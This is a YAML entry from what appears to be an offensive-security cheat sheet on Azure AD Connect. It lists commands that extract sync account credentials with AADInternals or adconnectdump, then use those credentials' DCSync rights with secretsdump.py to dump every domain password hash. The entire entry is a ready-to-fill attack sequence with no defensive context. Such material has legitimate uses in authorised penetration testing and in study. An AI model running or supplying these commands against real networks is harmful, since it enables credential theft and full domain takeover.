name: AzureADConnect
description: Azure AD Connect accounts often have DCSync rights
commands:
- '# If admin on AAD Connect server:'
- Install-Module AADInternals
- Get-AADIntSyncCredentials
- ''
- '# Or use adconnectdump'
- python adconnectdump.py <DOMAIN>/<USER>:<PASSWORD>@<AADC_SERVER>
- ''
- '# With DCSync rights - dump domain'
- secretsdump.py '<DOMAIN>/<MSOL_ACCOUNT>:<PASSWORD>@<DC>'
opsec: []
references: []
